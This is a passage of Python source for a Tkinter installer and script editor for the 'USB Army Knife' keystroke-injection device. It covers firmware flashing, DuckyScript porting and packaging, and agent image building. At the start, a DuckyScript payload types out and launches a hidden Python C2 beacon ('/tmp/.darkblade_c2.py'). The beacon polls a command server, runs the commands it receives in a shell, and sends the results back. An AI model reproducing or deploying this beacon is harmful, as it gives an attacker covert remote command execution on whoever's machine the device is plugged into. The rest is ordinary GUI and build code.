                "STRING while True:", "ENTER",
                "STRING     try:", "ENTER",
                "STRING         req=urllib.request.Request(c2+'/api/beacon/checkin/'+bid, data=b'')", "ENTER",
                "STRING         j=json.loads(urllib.request.urlopen(req,timeout=10).read().decode())", "ENTER",
                "STRING         cmds=j.get('commands',[])", "ENTER",
                "STRING         for c in cmds:", "ENTER",
                "STRING             cid=c.get('id'); cmd=c.get('command')", "ENTER",
                "STRING             p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)", "ENTER",
                "STRING             out=p.communicate()[0]", "ENTER",
                "STRING             res=json.dumps({'result':out}).encode()", "ENTER",
                "STRING             req=urllib.request.Request(c2+'/api/beacon/result/'+str(cid), data=res, headers={'Content-Type':'application/json'})", "ENTER",
                "STRING             urllib.request.urlopen(req,timeout=10).read()", "ENTER",
                "STRING     except Exception as e:", "ENTER",
                "STRING         time.sleep(10)", "ENTER",
                "STRING     time.sleep(60)", "ENTER",
                "STRING PY", "ENTER",
                "STRING python3 /tmp/.darkblade_c2.py &", "ENTER"
            ]
            header = [f"REM Ported for {target}", f"REM Server: {server}"]
            return "\n".join(header + seq)

        # Otherwise do lightweight mapping of common commands
        lines = []
        open_term_injected = False
        for raw in text.splitlines():
            line = raw
            s = raw.strip()
            u = s.upper()
            # Map GUI r
            if re.match(r"^GUI\s+r\b", s, flags=re.IGNORECASE):
                if target == 'linux':
                    line = "CTRL ALT T\nDELAY 600"
                    open_term_injected = True
                elif target == 'macos':
                    # Spotlight -> Terminal
                    line = "CMD SPACE\nDELAY 300\nSTRING Terminal\nENTER\nDELAY 800"
                    open_term_injected = True
                else:
                    line = raw
            # Map STRING cmd /c ... -> bash -lc "..."
            m = re.match(r"^STRING\s+cmd\s+/c\s+(.*)$", s, flags=re.IGNORECASE)
            if m and target in ('linux','macos'):
                payload = m.group(1)
                # Replace Windows path backslashes
                payload = payload.replace('\\\\','/').replace('\\','/')
                line = f'STRING bash -lc "{payload}"'
            # Map powershell one-liners to rough bash equivalents
            m2 = re.match(r"^STRING\s+powershell(.*)$", s, flags=re.IGNORECASE)
            if m2 and target in ('linux','macos'):
                rest = m2.group(1).strip()
                trans = rest
                trans = trans.replace("Get-ComputerInfo","uname -a")
                trans = trans.replace("Get-Date","date")
                line = f'STRING bash -lc "{trans}"'
            # Map common commands inside STRING
            if s.upper().startswith("STRING "):
                body = raw.split(" ",1)[1]
                if target in ('linux','macos'):
                    rep = body
                    # Windows command translations
                    rep = re.sub(r"\bipconfig\b", "ip a", rep, flags=re.IGNORECASE)
                    rep = re.sub(r"\bsysteminfo\b", "uname -a; lsb_release -a || cat /etc/os-release", rep, flags=re.IGNORECASE)
                    rep = re.sub(r"\bdir\b", "ls -la", rep, flags=re.IGNORECASE)
                    rep = rep.replace('\\\\','/').replace('\\','/')
                    # notepad -> gedit (or nano if terminal opened)
                    if re.search(r"\bnotepad\b", rep, flags=re.IGNORECASE):
                        rep = re.sub(r"\bnotepad\b", "gedit" if not open_term_injected else "nano", rep, flags=re.IGNORECASE)
                    line = f"STRING {rep}"
                elif target == 'windows':
                    line = raw
            # Map RUN command (our extended DSL)
            if u.startswith('RUN '):
                cmd = raw.split(' ',1)[1]
                if target in ('linux','macos'):
                    line = f'STRING bash -lc "{cmd}"\nENTER'
                else:
                    line = f'STRING cmd /c {cmd}\nENTER'
            lines.append(line)
        # Add header comment
        return "REM Ported for " + target + "\n" + "\n".join(lines)

    def _build_script_with_manifest(self):
        content = self.duckyscript_editor.get("1.0", tk.END)
        # Optional OS-specific porting
        try:
            tgt = (self.target_os.get() or 'generic').lower()
            if tgt in ('windows','linux','macos') and self.auto_port_var.get() == 1:
                content = self._port_duckyscript(tgt, content)
        except Exception:
            pass
        # Ensure CRLF endings
        content = content.replace("\r\n", "\n").replace("\r", "\n").replace("\n", "\r\n")
        lines = [
            f"REM Name: {self.manifest_name.get().strip() or 'USBArmyKnife Script'}",
            f"REM TargetOS: {self.target_os.get()}",
            f"REM Notes: {self.manifest_notes.get().strip()}"
        ]
        fw_layout = self._layout_for_firmware()
        if fw_layout:
            lines.append(f"KEYBOARD_LAYOUT {fw_layout}")
        return "\r\n".join(lines) + "\r\n" + content

    def package_to_drive(self):
        if not self.armed_var.get():
            messagebox.showwarning("Not Armed", "Enable the 'Armed (consent)' toggle to proceed.")
            return
        dest = filedialog.askdirectory(title="Select target drive/folder")
        if not dest:
            return
        script_content = self._build_script_with_manifest()
        try:
            with open(os.path.join(dest, "autorun.ds"), "w", newline="\r\n", encoding="utf-8") as f:
                f.write(script_content)
            sha = hashlib.sha256(script_content.encode("utf-8")).hexdigest()
            with open(os.path.join(dest, "autorun.ds.sha256"), "w") as hf:
                hf.write(sha + "\n")
            manifest = {
                "name": self.manifest_name.get().strip() or "USBArmyKnife Script",
                "target_os": self.target_os.get(),
                "layout": self.layout_combobox.get(),
                "notes": self.manifest_notes.get().strip(),
                "packaged_at": datetime.utcnow().isoformat() + "Z"
            }
            with open(os.path.join(dest, "manifest.json"), "w", encoding="utf-8") as mf:
                json.dump(manifest, mf, indent=2)
            # Also drop a layout.txt for the agent/firmware to read
            try:
                with open(os.path.join(dest, "layout.txt"), "w", encoding="utf-8") as lf:
                    lf.write((self._layout_for_firmware() or "en-US") + "\n")
            except Exception:
                pass
            messagebox.showinfo("Packaged", "Files written (autorun.ds, .sha256, manifest.json)")
            self._audit_log(f"Packaged script to {dest}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def filter_library(self):
        q = (self.library_search.get() or "").lower()
        self.library_tree.delete(*self.library_tree.get_children())
        for desc, path in getattr(self, "_library_cache", []):
            if q in desc.lower() or q in os.path.basename(path).lower():
                self.library_tree.insert("", tk.END, values=(desc, path))

    def import_duckyscript(self):
        src = filedialog.askopenfilename(title="Import .ds", filetypes=[("DuckyScript","*.ds")])
        if not src:
            return
        os.makedirs("duckyscripts", exist_ok=True)
        dest = os.path.join("duckyscripts", os.path.basename(src))
        try:
            shutil.copy2(src, dest)
            self.load_duckyscript_library()
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def export_selected_duckyscript(self):
        sel = self.library_tree.focus()
        if not sel:
            return
        path = self.library_tree.item(sel, "values")[1]
        dst = filedialog.asksaveasfilename(defaultextension=".ds", initialfile=os.path.basename(path))
        if not dst:
            return
        try:
            shutil.copy2(path, dst)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def import_script_to_editor(self):
        """Import a script file directly into the editor for conversion and editing.
        Also attempts to auto-detect source format (BadUSB/BadKB/DuckyScript)
        and preselects the converter dropdowns accordingly.
        """
        src = filedialog.askopenfilename(
            title="Import script",
            filetypes=[
                ("DuckyScript", "*.ds"),
                ("Text", "*.txt"),
                ("All", "*.*"),
            ]
        )
        if not src:
            return
        try:
            with open(src, "r", errors="ignore") as f:
                content = f.read()
            self.duckyscript_editor.delete("1.0", tk.END)
            self.duckyscript_editor.insert(tk.END, content)
            self._highlight_editor()
            self.run_lint()
            # Auto-detect and preselect converter format
            try:
                fmt = self._detect_external_script_format(content)
                if fmt in ("BadUSB", "BadKB") and hasattr(self, 'from_combobox'):
                    self.from_combobox.set(fmt)
                    # Default target
                    if hasattr(self, 'to_combobox') and not (self.to_combobox.get() or '').strip():
                        self.to_combobox.set("DuckyScript 2.0")
                    # Focus the Converter tab to encourage conversion workflow
                    try:
                        if hasattr(self, 'ducky_notebook') and hasattr(self, '_ducky_converter_tab'):
                            # Ensure outer DuckyScript main tab is selected
                            if hasattr(self, 'notebook') and hasattr(self, '_main_tab_duckyscript'):
                                self.notebook.select(self._main_tab_duckyscript)
                            self.ducky_notebook.select(self._ducky_converter_tab)
                    except Exception:
                        pass
            except Exception:
                pass
        except Exception as e:
            messagebox.showerror("Import", str(e))

    def _audit_log(self, msg):
        try:
            with open("audit.log", "a", encoding="utf-8") as lf:
                lf.write(f"{datetime.utcnow().isoformat()}Z - {msg}\n")
        except Exception:
            pass

    def _detect_external_script_format(self, content: str) -> str:
        """Heuristically detect if an external script is BadUSB, BadKB, or DuckyScript.
        Returns one of: 'BadKB', 'BadUSB', 'DuckyScript'.
        """
        txt = content or ""
        lines = [l.strip() for l in txt.splitlines() if l.strip()]
        head = "\n".join(lines[:50]).lower()

        # Indicators for DuckyScript
        ds_tokens = (
            "rem ", "delay ", "default_delay", "defaultdelay", "string ", "enter",
            "gui ", "ctrl ", "alt ", "shift ", "repeat ", "keyboard_layout ", "led_off", "tft_off", "tft_on"
        )
        if any(l.upper().startswith(("REM","DELAY","DEFAULT_DELAY","DEFAULTDELAY","STRING","ENTER","GUI","CTRL","ALT","SHIFT","REPEAT","KEYBOARD_LAYOUT","LED_OFF","TFT_OFF","TFT_ON")) for l in lines[:100]):
            return "DuckyScript"

        # Indicators for BadKB (function-like syntax / Key enums)
        if re.search(r"\b(Press|Release|Type|TypeLine|Delay|Repeat)\s*\(", content):
            return "BadKB"
        if re.search(r"\bKey\.[A-Z0-9_]+", content):
            return "BadKB"

        # Fallback to BadUSB if not DS/BadKB
        return "BadUSB"

    def _install_clipboard_support(self):
        # Global keybindings for copy/paste/select-all
        try:
            self.bind_all("<Control-c>", lambda e: e.widget.event_generate('<<Copy>>'))
            self.bind_all("<Control-x>", lambda e: e.widget.event_generate('<<Cut>>'))
            self.bind_all("<Control-v>", lambda e: e.widget.event_generate('<<Paste>>'))
            self.bind_all("<Control-a>", lambda e: e.widget.event_generate('<<SelectAll>>'))
        except Exception:
            pass
        # Right-click context menu for editable widgets
        def popup(e):
            w = e.widget
            menu = tkcore.Menu(self, tearoff=0)
            def _safe(cmd):
                try:
                    # Temporarily enable disabled Text to allow Copy
                    restore = False
                    if isinstance(w, tkcore.Text):
                        st = str(w.cget('state'))
                        if st == tk.DISABLED:
                            w.config(state=tk.NORMAL)
                            restore = True
                    if cmd == 'cut':
                        w.event_generate('<<Cut>>')
                    elif cmd == 'copy':
                        # Try virtual event first
                        try:
                            w.event_generate('<<Copy>>')
                        except Exception:
                            try:
                                sel = w.selection_get()
                                self.clipboard_clear(); self.clipboard_append(sel)
                            except Exception:
                                pass
                    elif cmd == 'paste':
                        w.event_generate('<<Paste>>')
                    elif cmd == 'selectall':
                        w.event_generate('<<SelectAll>>')
                finally:
                    try:
                        if isinstance(w, tkcore.Text) and restore:
                            w.config(state=tk.DISABLED)
                    except Exception:
                        pass
            menu.add_command(label="Cut", command=lambda: _safe('cut'))
            menu.add_command(label="Copy", command=lambda: _safe('copy'))
            menu.add_command(label="Paste", command=lambda: _safe('paste'))
            menu.add_separator()
            menu.add_command(label="Select All", command=lambda: _safe('selectall'))
            try:
                menu.tk_popup(e.x_root, e.y_root)
            finally:
                try:
                    menu.grab_release()
                except Exception:
                    pass
        # Bind to common widget classes
        for cls in ('Text', 'Entry', 'TEntry', 'TCombobox'):
            try:
                self.bind_class(cls, '<Button-3>', popup)
            except Exception:
                pass

    # ===== Helpers & new actions =====
    def show_connection_help(self):
        try:
            txt = (
                "Troubleshooting connection (ESP32-S3 / T-Dongle-S3):\n\n"
                "1) Add serial permissions (Linux):\n"
                "   sudo usermod -a -G dialout $USER\n"
                "   Log out/in after running.\n\n"
                "2) Create udev rule for Espressif (VID 303A):\n"
                "   echo 'SUBSYSTEM==\"tty\", ATTRS{idVendor}==\"303a\", MODE=\"0666\"' | sudo tee /etc/udev/rules.d/99-esp32s3.rules\n"
                "   sudo udevadm control --reload-rules && sudo udevadm trigger\n\n"
                "3) Replug the device. If needed, hold BOOT while plugging in to enter download mode.\n\n"
                "4) On some systems, install usb serial drivers or ensure ModemManager is not interfering.\n"
            )
            messagebox.showinfo("Connection Help", txt)
        except Exception:
            pass

    def _make_scrollable(self, parent):
        """Create a vertical scrollable area inside parent.
        Returns (container_frame, canvas, inner_frame).
        """
        container = tk.Frame(parent)
        canvas = tkcore.Canvas(container, highlightthickness=0)
        scrollbar = tk.Scrollbar(container, orient=tk.VERTICAL, command=canvas.yview)
        inner = tk.Frame(canvas)
        
        inner.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        win_id = canvas.create_window((0, 0), window=inner, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        def _resize(event):
            try:
                canvas.itemconfig(win_id, width=event.width)
            except Exception:
                pass
        canvas.bind("<Configure>", _resize)
        
        # Remember this canvas as active when hovered for global scroll routing
        def _focus_scroll(_):
            try:
                self._active_scroll_canvas = canvas
            except Exception:
                pass
        for w in (container, canvas, inner):
            try:
                w.bind("<Enter>", _focus_scroll)
            except Exception:
                pass
        
        # Local smooth scrolling support (fallback)
        def _wheel(event):
            try:
                delta = getattr(event, 'delta', 0)
                if delta:
                    steps = int(-delta/120) or (-1 if delta>0 else 1)
                    canvas.yview_scroll(steps, "units")
            except Exception:
                pass
        def _linux_scroll(event):
            try:
                if event.num == 4:
                    canvas.yview_scroll(-3, "units")
                elif event.num == 5:
                    canvas.yview_scroll(3, "units")
            except Exception:
                pass
        for w in (container, canvas, inner):
            try:
                w.bind("<MouseWheel>", _wheel)
                w.bind("<Button-4>", _linux_scroll)
                w.bind("<Button-5>", _linux_scroll)
            except Exception:
                pass
        
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        return container, canvas, inner

    def _ensure_global_scroll_bindings(self):
        """Bind global wheel/touchpad keys and route to the scrollable Canvas under cursor.
        Falls back to the last active scroll canvas.
        """
        def _canvas_under_cursor():
            try:
                x, y = self.winfo_pointerxy()
                w = self.winfo_containing(x, y)
                while w is not None and not isinstance(w, tkcore.Canvas):
                    w = getattr(w, 'master', None)
                return w
            except Exception:
                return None
        def _target_canvas():
            cv = _canvas_under_cursor()
            if cv is None:
                cv = getattr(self, '_active_scroll_canvas', None)
            return cv
        def _route_wheel(event):
            try:
                cv = _target_canvas()
                if cv is None:
                    return
                delta = getattr(event, 'delta', 0)
                if delta:
                    steps = int(-delta/120) or (-1 if delta>0 else 1)
                    cv.yview_scroll(steps, 'units')
            except Exception:
                pass
        def _route_linux(event):
            try:
                cv = _target_canvas()
                if cv is None:
                    return
                if event.num == 4:
                    cv.yview_scroll(-3, 'units')
                elif event.num == 5:
                    cv.yview_scroll(3, 'units')
            except Exception:
                pass
        def _route_keys(event):
            try:
                cv = _target_canvas()
                if cv is None:
                    return
                key = event.keysym
                if key == 'Up':
                    cv.yview_scroll(-1, 'units')
                elif key == 'Down':
                    cv.yview_scroll(1, 'units')
                elif key in ('Prior', 'Page_Up'):
                    cv.yview_scroll(-1, 'pages')
                elif key in ('Next', 'Page_Down'):
                    cv.yview_scroll(1, 'pages')
            except Exception:
                pass
        try:
            self.bind_all('<MouseWheel>', _route_wheel)
            self.bind_all('<Button-4>', _route_linux)
            self.bind_all('<Button-5>', _route_linux)
            self.bind_all('<Up>', _route_keys)
            self.bind_all('<Down>', _route_keys)
            self.bind_all('<Prior>', _route_keys)
            self.bind_all('<Next>', _route_keys)
        except Exception:
            pass

    def _resolve_env_name(self):
        """Resolve the correct PlatformIO env name for T-Dongle-S3.
        Falls back between hyphen and underscore variants based on platformio.ini.
        """
        ini_path = os.path.join("USBArmyKnife", "platformio.ini")
        try:
            with open(ini_path, "r", encoding="utf-8", errors="ignore") as f:
                txt = f.read()
            if "[env:LILYGO-T-Dongle-S3]" in txt:
                return "LILYGO-T-Dongle-S3"
            if "[env:LILYGO_T_DONGLE_S3]" in txt:
                return "LILYGO_T_DONGLE_S3"
        except Exception:
            pass
        return "LILYGO-T-Dongle-S3"

    def show_help(self):
        win = tk.Toplevel(self)
        win.title("How to use USB Army Knife Installer")
        win.geometry("700x500")
        frm = tk.Frame(win)
        frm.pack(fill=tk.BOTH, expand=True)
        txt = tk.Text(frm, wrap=tk.WORD)
        txt.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        content = (
            "USB Army Knife Installer — Quick Guide\n\n"
            "1) Welcome tab:\n"
            "   • Run Preflight Checks to verify dependencies.\n"
            "   • Clone Repository & Update Submodules to fetch sources.\n\n"
            "2) Flasher tab:\n"
            "   • Click Detect Devices. If none, use Connection Help.\n"
            "   • Optional: Full erase before flash and/or Lower baud (115200) if uploads are flaky.\n"
            "   • Install Firmware to flash the board.\n"
            "   • When prompted, Upload Filesystem.\n"
            "   • Tools: Open Web UI (http://4.3.2.1:8080) and SD Card Assistant to prep a card.\n\n"
            "3) eFuse tab (advanced):\n"
            "   • Read eFuse Summary to see USB_PHY_SEL.\n"
            "   • Only burn USB_PHY_SEL if absolutely required. This is irreversible.\n\n"
            "4) Agent tab:\n"
            "   • Select the mounted drive.\n"
            "   • Create agent.img from a published Agent folder (per tools/README), Download prebuilt from GitHub, or Select existing agent.img.\n"
            "   • Copy agent.img to the drive.\n"
            "   • Use Create RESET flag to recover from bad settings.\n\n"
            "5) DuckyScript tab:\n"
            "   • Edit scripts, Lint, and Save to Device or Package to Drive.\n"
            "   • Commands like LED_OFF, TFT_OFF/ON are supported.\n\n"
            "Troubleshooting:\n"
            "   • Connection Help explains serial permissions and udev rules.\n"
            "   • Logs are saved under ./logs/.\n"
            "   • If the screen shows running but seems stuck, ensure filesystem was uploaded, SD is good, and check /data.json.\n"
        )
        try:
            txt.insert(tk.END, content)
            txt.config(state=tk.DISABLED)
        except Exception:
            pass
        tk.Button(win, text="Close", command=win.destroy).pack(pady=5)

    def _parse_usb_phy_sel(self, summary_text: str):
        """Parse espefuse summary output for USB_PHY_SEL status."""
        try:
            for line in (summary_text or "").splitlines():
                if "USB_PHY_SEL" in line:
                    # Heuristic: mark as BURNED if the line shows "= 1" or "True" else UNBURNED
                    if re.search(r"\b(=\s*1|True)\b", line):
                        return "USB_PHY_SEL: BURNED (set)"
                    return "USB_PHY_SEL: UNBURNED (not set)"
        except Exception:
            pass
        return None

    def _ensure_platformio(self, console_widget):
        """Ensure PlatformIO CLI is available; print guidance if missing."""
        try:
            # Check if pio is in PATH
            if shutil.which("pio") is None:
                raise FileNotFoundError
            return True
        except Exception:
            try:
                console_widget.insert(tk.END, "PlatformIO (pio) not found in PATH.\n")
                console_widget.insert(tk.END, "Install options:\n")
                console_widget.insert(tk.END, "  • pipx install platformio (recommended)\n")
                console_widget.insert(tk.END, "  • pip install --user platformio\n")
                console_widget.insert(tk.END, "  • pip install platformio --break-system-packages (Debian/Kali)\n")
                console_widget.insert(tk.END, "After installation, make sure ~/.local/bin is in your PATH.\n")
                console_widget.insert(tk.END, "Then restart this installer.\n")
            except Exception:
                pass
            try:
                messagebox.showerror("PlatformIO missing", 
                    "PlatformIO (pio) is not installed or not in PATH.\n\n"
                    "Install options:\n"
                    "  • pipx install platformio\n"
                    "  • pip install platformio --break-system-packages\n\n"
                    "Then restart this app.")
            except Exception:
                pass
            return False

    def browse_agent_pubdir(self):
        path = filedialog.askdirectory(title="Select published Agent folder (contains PortableApp.exe, in1.bat, ...)")
        if path:
            self.agent_pubdir_var.set(path)

    def select_existing_agent_img(self):
        path = filedialog.askopenfilename(title="Select agent.img", filetypes=[("Agent image","agent.img"),("All","*.*")])
        if path:
            self.agent_img_path_var.set(path)

    def select_agent_zip(self):
        zip_path = filedialog.askopenfilename(title="Select agent artifact zip", filetypes=[("Zip","*.zip"),("All","*.*")])
        if not zip_path:
            return
        self.agent_console_text.delete("1.0", tk.END)
        self.agent_console_text.insert(tk.END, f"Using artifact zip: {zip_path}\n")
        try:
            with tempfile.TemporaryDirectory() as td:
                with zipfile.ZipFile(zip_path, 'r') as zf:
                    zf.extractall(td)
                # Find published agent folder
                pubdir = None
                for root, dirs, files in os.walk(td):
                    if "in1.bat" in files or "PortableApp.exe" in files or "Agent.exe" in files:
                        pubdir = root
                        break
                if not pubdir:
                    self.agent_console_text.insert(tk.END, "Could not find published agent files in zip.\n")
                    return
                self.agent_console_text.insert(tk.END, f"Detected published agent folder: {pubdir}\n")
                # Ask to build now
                try:
                    if messagebox.askyesno("Build agent.img", "Build agent.img from this folder now?"):
                        # Set pubdir and build
                        self.agent_pubdir_var.set(pubdir)
                        try:
                            size_mib = max(64, int(self.agent_img_size_var.get()))
                        except Exception:
                            size_mib = 500
                        out_path = (self.agent_img_path_var.get() or os.path.abspath("agent.img")).strip()
                        self._create_agent_image_thread(pubdir, out_path, size_mib)
                        self.agent_img_path_var.set(out_path)
                        self.agent_console_text.insert(tk.END, f"Prepared agent image: {out_path}\n")
                    else:
                        # Just set pubdir for manual build
                        self.agent_pubdir_var.set(pubdir)
                except Exception:
                    self.agent_pubdir_var.set(pubdir)
        except Exception as e:
            messagebox.showerror("Agent zip", str(e))

    def prompt_github_token(self):
        try:
            token = simpledialog.askstring("GitHub Token", "Enter GitHub token (will be used only in-memory):", show="*")
        except Exception:
            token = None
        if token:
            # Do not log token. Keep in-memory only.
            self._gh_token = token.strip()
            self.agent_console_text.insert(tk.END, "GitHub token set in-memory.\n")

    def create_agent_image(self):
        pubdir = (self.agent_pubdir_var.get() or "").strip()
        if not pubdir or not os.path.isdir(pubdir):
            self.agent_console_text.insert(tk.END, "Select a valid published Agent folder first.\n")
            return
        try:
            size_mib = max(64, int(self.agent_img_size_var.get()))
        except Exception:
            size_mib = 500
        out_path = (self.agent_img_path_var.get() or os.path.abspath("agent.img")).strip()
        self.agent_img_path_var.set(out_path)
        self.agent_console_text.delete("1.0", tk.END)
        self.agent_console_text.insert(tk.END, f"Creating agent image at {out_path} ({size_mib} MiB) ...\n")
        threading.Thread(target=self._create_agent_image_thread, args=(pubdir, out_path, size_mib), daemon=True).start()

    def download_prebuilt_agent(self):
        self.agent_console_text.delete("1.0", tk.END)
        self.agent_console_text.insert(tk.END, "Downloading latest prebuilt agent artifact from GitHub...\n")
        threading.Thread(target=self._download_prebuilt_agent_thread, daemon=True).start()

    def _free_loop_device(self):
        try:
            res = subprocess.run("sudo losetup -f", shell=True, capture_output=True, text=True)
            dev = (res.stdout or "").strip()
            return dev if dev.startswith("/dev/loop") else "/dev/loop0"
        except Exception:
            return "/dev/loop0"

    def _create_agent_image_thread(self, pubdir, out_path, size_mib):
        try:
            # Remove existing image if present
            try:
                if os.path.exists(out_path):
                    os.remove(out_path)
            except Exception:
                pass
            # Create empty file and partition/format
            cmd = f"dd if=/dev/zero bs=1048576 count={size_mib} of=\"{out_path}\""
            self.run_command(cmd, self.agent_console_text)
            loop = self._free_loop_device()
            self.run_command(f"sudo losetup {loop} \"{out_path}\"", self.agent_console_text)
            self.run_command(f"sudo parted --script {loop} mktable msdos mkpart primary 2048s 100%", self.agent_console_text)
            self.run_command(f"sudo losetup -d {loop}", self.agent_console_text)
            self.run_command(f"sudo losetup -P {loop} \"{out_path}\"", self.agent_console_text)
            part = f"{loop}p1"
            self.run_command(f"sudo mkfs.vfat {part}", self.agent_console_text)
            mnt = "/tmp/mnt"
            os.makedirs(mnt, exist_ok=True)
            self.run_command(f"sudo mount {part} {mnt}", self.agent_console_text)
            # Copy all published files into the image using sudo cp
            self.run_command(f"sudo cp -r \"{pubdir}\"/* {mnt}/", self.agent_console_text)
            self.run_command(f"sudo umount {mnt}", self.agent_console_text)
            self.run_command(f"sudo losetup -d {loop}", self.agent_console_text)
            self.agent_console_text.insert(tk.END, "agent.img created successfully.\n")
        except Exception as e:
            self.agent_console_text.insert(tk.END, f"\nError creating agent image: {e}\nIf you see permission errors, run as root or execute the listed commands with sudo.\n")

    def _github_json(self, url):
        headers = {"User-Agent": "UAk-Installer", "Accept": "application/vnd.github+json"}
        if getattr(self, "_gh_token", None):
            headers["Authorization"] = f"Bearer {self._gh_token}"
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read().decode("utf-8", errors="ignore"))

    def _download_to(self, url, dest, accept=None):
        headers = {"User-Agent": "UAk-Installer"}
        if accept:
            headers["Accept"] = accept
        if getattr(self, "_gh_token", None):
            headers["Authorization"] = f"Bearer {self._gh_token}"
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)

    def _download_prebuilt_agent_thread(self):
        try:
            # Find latest successful run of dotnet workflow
            runs = self._github_json("https://api.github.com/repos/i-am-shodan/USBArmyKnife/actions/workflows/dotnet.yml/runs?status=success&per_page=1")
            run = (runs.get("workflow_runs") or [None])[0]
            if not run:
                self.agent_console_text.insert(tk.END, "No successful workflow runs found.\n")
                return
            run_id = run.get("id")
            arts = self._github_json(f"https://api.github.com/repos/i-am-shodan/USBArmyKnife/actions/runs/{run_id}/artifacts")
            artifacts = arts.get("artifacts") or []
            if not artifacts:
                self.agent_console_text.insert(tk.END, "No artifacts found in latest run.\n")
                return
            # Prefer an artifact likely containing agent image
            artifact = None
            for a in artifacts:
                name = (a.get("name") or "").lower()
                if "agent" in name:
                    artifact = a
                    break
            if artifact is None:
                artifact = artifacts[0]
            # Build documented artifact download URL (zip)
            art_id = artifact.get("id")
            if not art_id:
                self.agent_console_text.insert(tk.END, "Artifact missing id.\n")
                return
            url_primary = f"https://api.github.com/repos/i-am-shodan/USBArmyKnife/actions/artifacts/{art_id}/zip"
            url_fallback = artifact.get("archive_download_url")
            self.agent_console_text.insert(tk.END, f"Downloading artifact: {artifact.get('name')}...\n")
            with tempfile.TemporaryDirectory() as td:
                zip_path = os.path.join(td, "artifact.zip")
                # Try primary endpoint (no Accept first to avoid 415 on some GH setups)
                try:
                    self._download_to(url_primary, zip_path, accept=None)
                except Exception as e1:
                    # Retry with explicit zip accept
                    try:
                        self._download_to(url_primary, zip_path, accept="application/zip")
                    except Exception as e2:
                        # Fallback to archive_download_url with octet-stream
                        if url_fallback:
                            try:
                                self._download_to(url_fallback, zip_path, accept="application/octet-stream")
                            except Exception as e3:
                                self.agent_console_text.insert(tk.END, f"All download attempts failed (primary, zip accept, fallback): {e3}\n")
                                raise
                        else:
                            self.agent_console_text.insert(tk.END, f"Download failed: {e2}\n")
                            raise
                # Unpack and locate *.img or published agent files
                try:
                    with zipfile.ZipFile(zip_path, 'r') as zf:
                        zf.extractall(td)
                except Exception as ex:
                    self.agent_console_text.insert(tk.END, f"Failed to unzip artifact: {ex}\n")
                    return
                found_img = None
                for root, _, files in os.walk(td):
                    for fn in files:
                        if fn.lower().endswith(".img"):
                            found_img = os.path.join(root, fn)
                            break
                    if found_img:
                        break
                out_path = os.path.abspath("agent.img")
                if found_img:
                    # Move to working dir and set as selected
                    try:
                        shutil.copy2(found_img, out_path)
                    except Exception:
                        shutil.move(found_img, out_path)
                    self.agent_img_path_var.set(out_path)
                    self.agent_console_text.insert(tk.END, f"Downloaded agent image: {out_path}\n")
                else:
                    # Try to find published agent folder (contains in1.bat or PortableApp.exe) and build agent.img
                    pubdir = None
                    for root, dirs, files in os.walk(td):
                        if "in1.bat" in files or "PortableApp.exe" in files or "Agent.exe" in files:
                            pubdir = root
                            break
                    if not pubdir:
                        self.agent_console_text.insert(tk.END, "No .img found and no published Agent folder detected in artifact.\n")
                        return
                    self.agent_console_text.insert(tk.END, f"No .img found. Building agent.img from artifact contents at {pubdir}...\n")
                    # Reuse image builder with default size
                    self._create_agent_image_thread(pubdir, out_path, 500)
                    self.agent_img_path_var.set(out_path)
                    self.agent_console_text.insert(tk.END, f"Prepared agent image: {out_path}\n")
        except Exception as e:
            msg = str(e)
            self.agent_console_text.insert(tk.END, f"Download failed: {msg}\n")
            # Hint for auth-required downloads
            if "HTTP Error 401" in msg or "HTTP Error 403" in msg:
                try:
                    self.agent_console_text.insert(tk.END, "Artifact downloads require a GitHub token. Click 'Set GitHub token...' and try again.\n")
                    if messagebox.askyesno("GitHub auth required", "Provide a GitHub token now? (classic PAT with repo read is sufficient)" ):
                        self.prompt_github_token()
                except Exception:
                    pass
            self.agent_console_text.insert(tk.END, "Alternatively, open the workflow page in your browser and download manually.\n")
            try:
                webbrowser.open("https://github.com/i-am-shodan/USBArmyKnife/actions/workflows/dotnet.yml")
            except Exception:
                pass

    def run_preflight(self):
        self.welcome_console_text.delete("1.0", tk.END)
        checks = []
        def ok(b):
            return "OK" if b else "MISSING"
        # git
        checks.append(("git", shutil.which("git") is not None))
        # pio
        checks.append(("pio", shutil.which("pio") is not None))
        # python modules
        def has_mod(m):
            try:
                __import__(m)
                return True
            except Exception:
                return False
        checks.append(("pyserial", has_mod("serial")))
        checks.append(("ttkbootstrap", has_mod("ttkbootstrap")))
        for name, present in checks:
            self.welcome_console_text.insert(tk.END, f"{name}: {ok(present)}\n")
        if not checks[1][1]:
            self.welcome_console_text.insert(tk.END, "\nInstall PlatformIO:\n")
            self.welcome_console_text.insert(tk.END, "  • pipx install platformio (recommended)\n")
            self.welcome_console_text.insert(tk.END, "  • pip install platformio --break-system-packages\n")
        if not checks[0][1]:
            self.welcome_console_text.insert(tk.END, "\nInstall git via your package manager.\n")
        if not checks[2][1]:
            self.welcome_console_text.insert(tk.END, "\nInstall pyserial:\n")
            self.welcome_console_text.insert(tk.END, "  • pip install pyserial\n")
            self.welcome_console_text.insert(tk.END, "  • pip install pyserial --break-system-packages\n")
        if not checks[3][1]:
            self.welcome_console_text.insert(tk.END, "\nInstall ttkbootstrap:\n")
            self.welcome_console_text.insert(tk.END, "  • pip install ttkbootstrap\n")
            self.welcome_console_text.insert(tk.END, "  • pip install ttkbootstrap --break-system-packages\n")

    def create_reset_flag(self):
        drive_path = self.selected_drive.get()
        if not drive_path:
            self.agent_console_text.insert(tk.END, "Please select the USBArmyKnife drive first.\n")
            return
        try:
            with open(os.path.join(drive_path, "RESET"), "w", encoding="utf-8") as f:
                f.write("reset\n")
            self.agent_console_text.insert(tk.END, "Created RESET flag file on the drive.\n")
        except Exception as e:
            self.agent_console_text.insert(tk.END, f"Error creating RESET flag: {e}\n")

    def sd_card_assistant(self):
